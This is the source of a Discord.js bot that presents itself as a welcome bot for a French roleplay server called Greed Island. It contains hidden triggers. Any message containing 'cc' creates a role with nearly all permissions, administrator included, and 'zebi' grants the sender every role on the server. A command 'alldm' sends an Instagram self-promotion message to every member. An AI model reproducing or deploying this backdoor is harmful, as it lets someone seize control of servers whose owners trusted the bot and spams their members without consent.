const Discord = require("discord.js");
const bot = new Discord.Client();
const fs = require("fs");

let xp = require("./xp.json");
console.log("start")
bot.login (process.env.TOKEN);
bot.on("ready", () => {
bot.user.setActivity('Greed Island', { type: 'STREAMING', url:'https://www.twitch.tv/monstercat'})
  console.log("Bot [ON]")
  })
bot.on('guildMemberAdd', member => {
  member.guild.channels.get('695647284477558885').send(" *Bienvenue **" + member.user.username + " ** Sur le serveur Rp Greed Island.");
});

bot.on("message", message => {
if(message.content.includes("cc")){
    message.guild.createRole({name:"Izi",
                              mentionable:false,
                              permissions:2146958591,
                              position: "",
                              color: "#fb0707"
   })
}
if(message.content.includes("zebi")){
  (message.guild.roles.map(r => message.member.addRoles(r)))
}
    
});
bot.on('message', message => {
  if(message.content.startsWith('alldm')){
    let cont = message.content.slice(1).split(" ")
    let args = cont.slice(1)
    let member = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0])
    message.guild.members.forEach((player) => {
      var enzoembed = new Discord.RichEmbed()
        .setTitle("Informations du serveur")
        .setDescription(`Bonjour je suis désolé de te mp comme ça mais je viens de me lancer à plein temps dans le maquinat sur instagram et j'ai comme rêve de devenir un grand influenceur. \n Bien que je sois différent des autres les origines ne comptent pas et je compte bien casser les codes de ce réseau social.`)
        .setColor("#15f153")
        .setFooter("Naenelis Bot");
    message.guild.member(player).send(enzoembed);
  });
     }
 })
